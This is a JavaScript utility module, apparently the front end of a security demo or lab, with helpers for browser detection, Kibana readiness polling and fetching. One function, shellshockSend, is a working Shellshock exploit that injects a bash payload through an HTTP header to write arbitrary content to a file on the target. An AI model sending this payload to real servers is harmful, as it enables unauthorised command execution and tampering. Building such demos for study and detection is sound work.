export const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

export const isChrome = () => {
  let res = false
  try {
    const isChromium = window.chrome
    const winNav = window.navigator
    const vendorName = winNav.vendor
    const isOpera = typeof window.opr !== 'undefined'
    const isIEedge = winNav.userAgent.indexOf('Edge') > -1
    const isIOSChrome = winNav.userAgent.match('CriOS')
    if (
      isIOSChrome === null &&
      isChromium !== null &&
      typeof isChromium !== 'undefined' &&
      vendorName === 'Google Inc.' &&
      isOpera === false &&
      isIEedge === false
    ) {
      res = true
    }
  } catch (e) {
    res = false
  }
  return res
}

export const untilKibanaIsReady = async (url, sleepTime) => {
  let res = false

  // simulate backend becomes ready early in development mode
  if (process.env.NODE_ENV === 'development') {
    console.log('development mode, simulating backend accessible in 6s.')
    await sleep(6000)
    res = true
  }

  while (!res) {
    try {
      const response = await fetch(url)
      const text = await response.text()
      if (text == null) {
        res = false
      } else {
        if (text.search('content security policy') > 0) {
          res = true
        }
      }
    } catch (err) {
      console.log('Error reading kibana status: ', err)
      res = false
    }
    if (!res) {
      await sleep(sleepTime)
    }
  }
  return res
}

export const shellshockSend = async (url, targetFile, content) => {
  var val = {
    success: false,
    errMsg: ''
  }
  try {
    const response = await fetch(url, {
      headers: new Headers({
        'X-Custom-Header': `() { :; }; echo; echo; /bin/bash -c "echo '${content}' > ${targetFile}"`
      })
    })
    if (response.status === 200) {
      val.success = true
    } else {
      val.errMsg = response.status
    }
  } catch (err) {
    val.errMsg = err
  }
  return val
}

export const fetchUrl = async url => {
  var val = {
    result: {},
    status: ''
  }
  try {
    const response = await fetch(url)
    if (response.status === 200) {
      val.result = await response.json()
      val.status = 'success'
    } else {
      val.status = `Failed to load ${url}. HTTP status code: ${response.status}`
    }
  } catch (err) {
    val.status = `Error loading ${url}. Error message: ${err}`
  }
  return val
}

export const windowNavigate = url => {
  window.location.href = url
}
